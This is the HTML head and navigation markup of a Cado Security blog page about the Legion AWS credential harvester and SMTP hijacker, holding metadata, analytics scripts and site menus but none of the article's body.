<!doctype html><html lang="en"><head>
    <meta charset="utf-8">
    <title>Legion: an AWS Credential Harvester and SMTP Hijacker</title>
    <link rel="shortcut icon" href="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Cado-Security-Favicon-%E2%80%93-2.png">
    <meta name="description" content="Cado Labs researchers recently encountered an emerging Python-based credential harvester and hacktool, named Legion.">
    
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.13.0/css/all.css" crossorigin="anonymous">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="Cado Labs researchers recently encountered an emerging Python-based credential harvester and hacktool, named Legion.">
    <meta property="og:title" content="Legion: an AWS Credential Harvester and SMTP Hijacker">
    <meta name="twitter:description" content="Cado Labs researchers recently encountered an emerging Python-based credential harvester and hacktool, named Legion.">
    <meta name="twitter:title" content="Legion: an AWS Credential Harvester and SMTP Hijacker">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>


  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-okaidia.min.css" integrity="sha256-zzHVEO0xOoVm0I6bT9v5SgpRs1cYNyvEvHXW/1yCgqU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.css" integrity="sha256-jsQbSO1yj62eu6dP6f2fJESRgkHNNEpxrK8NnO6/oyc=" crossorigin="anonymous">

<link rel="stylesheet" href="//14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/template_assets/156178194464/1728675369609/cado-unified4-srw/css/styles.min.css">
<link rel="stylesheet" href="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156175596464/1728675368615/module_156175596464_u4m-header.min.css">
<link rel="stylesheet" href="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156174727339/1728675369449/module_156174727339_u4m-blog-post-cards.min.css">
<link rel="stylesheet" href="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156174727456/1728675369364/module_156174727456_u4m-subscribe.min.css">
<link rel="stylesheet" href="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156174794365/1728675367442/module_156174794365_u4m-footer.min.css">
    <script type="application/ld+json">
{
  "mainEntityOfPage" : {
    "@type" : "WebPage",
    "@id" : "https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker"
  },
  "author" : {
    "name" : "jbowen@cadosecurity.com",
    "url" : "https://www.cadosecurity.com/blog/author/jbowencadosecurity-com",
    "@type" : "Person"
  },
  "headline" : "Legion: an AWS Credential Harvester and SMTP Hijacker",
  "datePublished" : "2023-04-13T10:00:00.000Z",
  "dateModified" : "2024-02-08T20:25:26.723Z",
  "publisher" : {
    "name" : "Cado Security Ltd",
    "logo" : {
      "url" : "https://f.hubspotusercontent00.net/hubfs/14518100/Cado-Logo-Color%20(2)%20(1)-1.png",
      "@type" : "ImageObject"
    },
    "@type" : "Organization"
  },
  "@context" : "https://schema.org",
  "@type" : "BlogPosting",
  "image" : [ "https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image4-27.png" ]
}
</script>


    
<!--  Added by GoogleAnalytics4 integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;


if (!window._hsGoogleConsentRunOnce) {
  window._hsGoogleConsentRunOnce = true;

  gtag('consent', 'default', {
    'ad_storage': 'denied',
    'analytics_storage': 'denied',
    'ad_user_data': 'denied',
    'ad_personalization': 'denied',
    'wait_for_update': waitForUpdateMillis
  });

  if (useGoogleConsentModeV2) {
    _hsp.push(['useGoogleConsentModeV2'])
  } else {
    _hsp.push(['addPrivacyConsentListener', function(consent){
      var hasAnalyticsConsent = consent && (consent.allowed || (consent.categories && consent.categories.analytics));
      var hasAdsConsent = consent && (consent.allowed || (consent.categories && consent.categories.advertisement));

      gtag('consent', 'update', {
        'ad_storage': hasAdsConsent ? 'granted' : 'denied',
        'analytics_storage': hasAnalyticsConsent ? 'granted' : 'denied',
        'ad_user_data': hasAdsConsent ? 'granted' : 'denied',
        'ad_personalization': hasAdsConsent ? 'granted' : 'denied'
      });
    }]);
  }
}

gtag('js', new Date());
gtag('set', 'developer_id.dZTQ1Zm', true);
gtag('config', 'G-S0BZ30LS47');
</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S0BZ30LS47"></script>

<!-- /Added by GoogleAnalytics4 integration -->

<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;



var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    if (useGoogleConsentModeV2) {

      gtag('set','developer_id.dZTQ1Zm',true);

      gtag('consent', 'default', {
      'ad_storage': 'denied',
      'analytics_storage': 'denied',
      'ad_user_data': 'denied',
      'ad_personalization': 'denied',
      'wait_for_update': waitForUpdateMillis
      });

      _hsp.push(['useGoogleConsentModeV2'])
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-P9BDTK9');

    window._hsGtmLoadOnce = true;
};

_hsp.push(['addPrivacyConsentListener', function(consent){
  if(consent.allowed || (consent.categories && consent.categories.analytics)){
    hsLoadGtm();
  }
}]);

</script>

<!-- /Added by GoogleTagManager integration -->


<!-- Google Tag Manager
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P9BDTK9');</script>
-->
<!-- Hotjar Tracking Code for Cado Security -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:5172881,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>
<link rel="amphtml" href="https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker?hs_amp=true">

<meta property="og:image" content="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image4-27.png">

<meta name="twitter:image" content="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image4-27.png">


<meta property="og:url" content="https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.cadosecurity.com/blog/rss.xml">
<meta name="twitter:domain" content="www.cadosecurity.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">






    
    <meta property="og:image" content="https://www.yourdomain.com/hubfs/yourimage.jpg">
<meta name="generator" content="HubSpot"></head>
<body class="  hs-content-id-156195647570 hs-blog-post hs-blog-id-156179862661  ">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P9BDTK9" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    
    

    


    
        <div id="hs_cos_wrapper_u4m-header" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><header class="u4m-header dark">
  
  <a class="skip-to-content-link" href="#main-content">Skip to content</a>
  
  <div class="inner">
    
    <div class="logo">
      <a href="https://www.cadosecurity.com/">
        
        <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/footer-logo.svg" width="144" height="29" alt="footer-logo">
        
      </a>
    </div>

    
    <div class="menu">
      
      
      <div class="menu-item">
        
        
        
        
          <a class="top-level-link has-dropdown" href="https://www.cadosecurity.com/product/platform">
          Product
          <div class="hover-area"></div>
          </a>
        
        
        
        
        <div class="dropdown-container ">
          <div class="dropdown-outer">
    
          <div class="dropdown-inner">
            <span class="border"></span>
            
            <div class="dropdown-column width-one">
              
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/product/platform">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Platform.svg" alt="Icon-Platform" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Platform</h5>
                      

                      
                        <p class="description">Explore the core capabilities of the Cado Platform.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/product/environments">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Environments.svg" alt="Icon-Environments" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Environments</h5>
                      

                      
                        <p class="description">Discover the broad support that the Cado platform offers.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/product/integrations">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Integrations.svg" alt="Icon-Integrations" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Integrations</h5>
                      

                      
                        <p class="description">Learn how the Cado platform integrates into your broader ecosystem.</p>
                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
       
          </div>
          </div>
        </div>
        
        
      </div>  
      
      <div class="menu-item">
        
        
        
        
          <a class="top-level-link has-dropdown" href="https://www.cadosecurity.com/solutions">
          Solutions
          <div class="hover-area"></div>
          </a>
        
        
        
        
        <div class="dropdown-container fullwidth">
          <div class="dropdown-outer">
    
          <div class="dropdown-inner">
            <span class="border"></span>
            
            <div class="dropdown-column width-two">
              <h6 class="column-heading">Use Cases</h6>
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/cross-cloud-investigations">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Cross-Cloud%20Investigations.svg" alt="Icon-Cross-Cloud Investigations" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Cross Cloud Investigations</h5>
                      

                      
                        <p class="description">Respond to incidents identified in AWS, Azure, and GCP in a single pane of glass.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/container-and-k8s-investigations">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Container-Investigations.svg" alt="Icon-Container-Investigations" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Container &amp; K8s Investigations</h5>
                      

                      
                        <p class="description">Perform container investigations in EKS, AKS, GKE, and Kubernetes.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/endpoint-triage">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Endpoint-Triage.svg" alt="Icon-Endpoint-Triage" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Endpoint Triage</h5>
                      

                      
                        <p class="description">Automate endpoint triage for immediate insights and quick escalation.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/saas-investigations">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-BEC-Compromise.svg" alt="Icon-BEC-Compromise" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">SaaS Investigations</h5>
                      

                      
                        <p class="description">Analyze critical SaaS logs to investigate Business Email Compromise.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/cloud-detection-and-response">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Incident-Containment.svg" alt="Icon-Incident-Containment" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Cloud Detection &amp; Response (CDR)</h5>
                      

                      
                        <p class="description">Marry threat detection with forensic context to expedite response. </p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/evidence-preservation">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Evidence-Preservation.svg" alt="Icon-Evidence-Preservation" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Evidence Preservation</h5>
                      

                      
                        <p class="description">Capture data immediately and preserve it before it disappears.</p>
                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
            <div class="dropdown-column width-one">
              <h6 class="column-heading">Cado For</h6>
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/dfir">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">DFIR</h5>
                      

                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/security-operations-center">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">SOC</h5>
                      

                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/mssp">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">MSSPs</h5>
                      

                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/partners">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Partners</h5>
                      

                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/solutions/government">

                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Government</h5>
                      

                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
       
          </div>
          </div>
        </div>
        
        
      </div>  
      
      <div class="menu-item">
        
        
        
        
          <a class="top-level-link has-dropdown" href="https://www.cadosecurity.com/resources">
          Resources
          <div class="hover-area"></div>
          </a>
        
        
        
        
        <div class="dropdown-container fullwidth">
          <div class="dropdown-outer">
    
          <div class="dropdown-inner">
            <span class="border"></span>
            
            <div class="dropdown-column width-two">
              
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/resources">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Report.svg" alt="Icon-Report" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">All Resources</h5>
                      

                      
                        <p class="description">Explore Cado Security's entire content library.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/blog">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Blog.svg" alt="Icon-Blog" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Blog</h5>
                      

                      
                        <p class="description">Timely commentary from the Cado Security team.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="/resources#playbook">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Playbook.svg" alt="Icon-Playbook" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Playbooks</h5>
                      

                      
                        <p class="description">Best practices for investigating and responding to threats. </p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="/resources#cheat-sheet">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Cheat-Sheet.svg" alt="Icon-Cheat-Sheet" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Cheat Sheets</h5>
                      

                      
                        <p class="description">Quick tips for investigating and responding to incidents.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/news-and-events">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-News.svg" alt="Icon-News" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">News</h5>
                      

                      
                        <p class="description">The latest Cado company announcements, press, and more.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/cado-community-edition">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Community.svg" alt="Icon-Community" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Community</h5>
                      

                      
                        <p class="description">Access to our free edition of the Cado platform.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://docs.cadosecurity.com/cado-response/intro" target="_blank" rel="noopener">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-documentation.svg" alt="Icon-documentation" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Documentation</h5>
                      

                      
                        <p class="description">Technical documentation on how to best leverage the Cado platform.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/wiki">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/Other%20Icons/White%20Paper%2080x80.svg" alt="White Paper 80x80" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Wiki</h5>
                      

                      
                        <p class="description">Everything you need to know about cloud security and cloud forensics. </p>
                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
       
          </div>
          </div>
        </div>
        
        
      </div>  
      
      <div class="menu-item">
        
        
        
        
          <a class="top-level-link has-dropdown" href="https://www.cadosecurity.com/about">
          Company
          <div class="hover-area"></div>
          </a>
        
        
        
        
        <div class="dropdown-container ">
          <div class="dropdown-outer">
    
          <div class="dropdown-inner">
            <span class="border"></span>
            
            <div class="dropdown-column width-one">
              
              
               <div class="sub-items-container">
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/about">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-About.svg" alt="Icon-About" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">About</h5>
                      

                      
                        <p class="description">Learn more about the Cado Security mission, vision, and team.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/careers">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Careers.svg" alt="Icon-Careers" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Careers</h5>
                      

                      
                        <p class="description">Check out current career opportunities at Cado Security.</p>
                      
                    </div>
                  </a>
               
                 
                  
                  
                 
                  <a class="sub-item" href="https://www.cadosecurity.com/cado-security-labs">

                    
                      <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/SRW%20-%20General%20Images/Icons/MegaNav/Icon-Incidident-Response%20Preparedness-II.svg" alt="Icon-Incidident-Response Preparedness-II" width="35" height="35">
                    

                    <div class="title-wrap">
                      
                        <h5 class="sub-item-text">Cado Security Labs</h5>
                      

                      
                        <p class="description">The research and development division at Cado Security</p>
                      
                    </div>
                  </a>
               
             </div>
            
            </div>
            
       
          </div>
          </div>
        </div>
        
        
      </div>  
      


    </div>
    
    
    
    <div class="search-toggle" tabindex="0">
      <svg class="search-toggle-button" width="18px" height="18px" viewbox="0 0 18 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
          <g id="Round-Three-Design" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
              <g id="CADO-Additional-Modules-R3" transform="translate(-1299, -58)" fill="#0E4271" fill-rule="nonzero">
                  <g id="search_FILL0_wght400_GRAD0_opsz24-(6)-Copy" transform="translate(1299, 58)">
                      <path d="M16.6,18 L10.3,11.7 C9.8,12.1 9.225,12.4166667 8.575,12.65 C7.925,12.8833333 7.23333333,13 6.5,13 C4.68333333,13 3.14583333,12.3708333 1.8875,11.1125 C0.629166667,9.85416667 0,8.31666667 0,6.5 C0,4.68333333 0.629166667,3.14583333 1.8875,1.8875 C3.14583333,0.629166667 4.68333333,0 6.5,0 C8.31666667,0 9.85416667,0.629166667 11.1125,1.8875 C12.3708333,3.14583333 13,4.68333333 13,6.5 C13,7.23333333 12.8833333,7.925 12.65,8.575 C12.4166667,9.225 12.1,9.8 11.7,10.3 L18,16.6 L16.6,18 Z M6.5,11 C7.75,11 8.8125,10.5625 9.6875,9.6875 C10.5625,8.8125 11,7.75 11,6.5 C11,5.25 10.5625,4.1875 9.6875,3.3125 C8.8125,2.4375 7.75,2 6.5,2 C5.25,2 4.1875,2.4375 3.3125,3.3125 C2.4375,4.1875 2,5.25 2,6.5 C2,7.75 2.4375,8.8125 3.3125,9.6875 C4.1875,10.5625 5.25,11 6.5,11 Z" id="Shape"></path>
                  </g>
              </g>
          </g>
      </svg>
    </div>
    
   
    <div class="cta">
      <span id="hs_cos_wrapper_u4m-header_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_cta" style="" data-hs-cos-general-type="widget" data-hs-cos-type="cta"><!--HubSpot Call-to-Action Code --><span class="hs-cta-wrapper" id="hs-cta-wrapper-a51b72aa-daa5-4df8-a061-1902834ccdb0"><span class="hs-cta-node hs-cta-a51b72aa-daa5-4df8-a061-1902834ccdb0" id="hs-cta-a51b72aa-daa5-4df8-a061-1902834ccdb0"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/14518100/a51b72aa-daa5-4df8-a061-1902834ccdb0"><img class="hs-cta-img" id="hs-cta-img-a51b72aa-daa5-4df8-a061-1902834ccdb0" style="border-width:0px;" src="https://no-cache.hubspot.com/cta/default/14518100/a51b72aa-daa5-4df8-a061-1902834ccdb0.png" alt="Get a Demo"></a></span><script charset="utf-8" src="/hs/cta/cta/current.js"></script><script type="text/javascript"> hbspt.cta._relativeUrls=true;hbspt.cta.load(14518100, 'a51b72aa-daa5-4df8-a061-1902834ccdb0', {"useNewLoader":"true","region":"na1"}); </script></span><!-- end HubSpot Call-to-Action Code --></span>
    </div>
   
    
    
    <button class="hamburger-toggle x2"><span class="lines"></span></button>
    
    <div class="offscreen-menu">
      <div class="content">
        
        <div class="mobile-search">
        <div class="hs-search-field"> 
  <div class="hs-search-field__bar"> 
    <form action="/hs-search-results">
      <input type="text" class="hs-search-field__input search-input" name="term" autocomplete="off" aria-label="Search" placeholder="Search">
      
      
      <input type="hidden" name="type" value="SITE_PAGE">
      <input type="hidden" name="type" value="LANDING_PAGE">
      <input type="hidden" name="type" value="BLOG_POST">
      <input type="hidden" name="type" value="LISTING_PAGE">
      <input type="hidden" name="type" value="KNOWLEDGE_ARTICLE">     
      
      
          
      
      
      
      
      <button aria-label="Search" class="search-button">
        
        <svg width="18px" height="18px" viewbox="0 0 18 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
          <g id="Round-Three-Design" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
              <g id="CADO-Additional-Modules-R3" transform="translate(-1299, -58)" fill="#0E4271" fill-rule="nonzero">
                  <g id="search_FILL0_wght400_GRAD0_opsz24-(6)-Copy" transform="translate(1299, 58)">
                      <path d="M16.6,18 L10.3,11.7 C9.8,12.1 9.225,12.4166667 8.575,12.65 C7.925,12.8833333 7.23333333,13 6.5,13 C4.68333333,13 3.14583333,12.3708333 1.8875,11.1125 C0.629166667,9.85416667 0,8.31666667 0,6.5 C0,4.68333333 0.629166667,3.14583333 1.8875,1.8875 C3.14583333,0.629166667 4.68333333,0 6.5,0 C8.31666667,0 9.85416667,0.629166667 11.1125,1.8875 C12.3708333,3.14583333 13,4.68333333 13,6.5 C13,7.23333333 12.8833333,7.925 12.65,8.575 C12.4166667,9.225 12.1,9.8 11.7,10.3 L18,16.6 L16.6,18 Z M6.5,11 C7.75,11 8.8125,10.5625 9.6875,9.6875 C10.5625,8.8125 11,7.75 11,6.5 C11,5.25 10.5625,4.1875 9.6875,3.3125 C8.8125,2.4375 7.75,2 6.5,2 C5.25,2 4.1875,2.4375 3.3125,3.3125 C2.4375,4.1875 2,5.25 2,6.5 C2,7.75 2.4375,8.8125 3.3125,9.6875 C4.1875,10.5625 5.25,11 6.5,11 Z" id="Shape"></path>
                  </g>
              </g>
          </g>
        </svg>
      </button>      

      <span class="search-overlay-close search-toggle-button" aria-label="Close">
        <i class="fas fa-times" aria-hidden="true"></i>
      </span>

    </form>
  </div>
  <ul class="hs-search-field__suggestions"></ul>
</div>
        </div>  
        
        <div class="mobile-menu">
        <span id="hs_cos_wrapper_u4m-header_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="menu"><div id="hs_menu_wrapper_u4m-header_" class="hs-menu-wrapper active-branch no-flyouts hs-menu-flow-vertical" role="navigation" data-sitemap-name="default" data-menu-id="156290876470" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Product</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/platform" role="menuitem">Platform</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/environments" role="menuitem">Environments</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/integrations" role="menuitem">Integrations</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Solutions</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions" role="menuitem">All Solutions</a></li>
    <li class="hs-menu-item hs-menu-depth-2 hs-item-has-children" role="none"><a href="javascript:;" role="menuitem">Use Cases</a>
     <ul role="menu" class="hs-menu-children-wrapper">
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/cross-cloud-investigations" role="menuitem">Cross Cloud Investigations</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/container-and-k8s-investigations" role="menuitem">Container &amp; K8s Investigations</a></li>
